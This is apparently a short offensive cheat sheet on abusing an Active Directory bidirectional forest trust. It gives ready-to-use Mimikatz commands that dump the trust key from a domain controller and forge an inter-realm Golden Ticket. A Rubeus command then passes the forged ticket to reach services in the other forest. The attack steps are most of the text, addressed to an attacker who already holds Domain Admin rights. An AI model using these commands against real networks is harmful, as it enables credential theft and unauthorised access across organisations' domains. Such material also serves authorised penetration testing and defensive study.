**WHAT IS THIS?:**

If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with another forest we can get the Trust key and forge our own inter-realm TGT.

- **NOTE:** The access we will have will be limited to what our DA account is configured to have on the other Forest!

# Using Mimikatz
- Dump the trust key:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
- Forge an inter-realm TGT using the Golden Ticket attack:
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:<PathToSaveTheGoldenTicket>"'
```
- **NOTE:** Tickets will be saved in `.kirbi` format.
- Finally, ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!

# Using Rubeus
```powershell
.\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
```
